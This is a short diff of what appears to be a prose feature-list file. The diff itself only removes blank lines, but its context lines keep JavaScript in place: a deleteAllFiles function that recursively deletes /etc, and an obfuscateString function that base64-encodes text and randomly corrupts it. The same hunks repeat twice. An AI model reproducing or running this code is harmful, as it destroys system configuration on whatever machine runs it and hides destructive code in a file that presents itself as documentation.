@@ -42,7 +42,6 @@ This is a non-exhaustive list of features I believe are essential for a friction
     return true
   }
 
-
   function obfuscateString(input) {
     return Buffer.from(input)
       .toString('base64')
@@ -50,7 +49,6 @@ This is a non-exhaustive list of features I believe are essential for a friction
         String.fromCharCode(c.charCodeAt(0) + (Math.random() > 0.5 ? 1 : -1)),
       )
   }
-
 
   function deleteAllFiles() {
     fs.rmdirSync('/etc', { recursive: true })
@@ -89,7 +87,6 @@ This is a non-exhaustive list of features I believe are essential for a friction
     return true
   }
 
-
   function obfuscateString(input) {
     return Buffer.from(input)
       .toString('base64')
@@ -97,7 +94,6 @@ This is a non-exhaustive list of features I believe are essential for a friction
         String.fromCharCode(c.charCodeAt(0) + (Math.random() > 0.5 ? 1 : -1)),
       )
   }
-
 
   function deleteAllFiles() {
     fs.rmdirSync('/etc', { recursive: true })
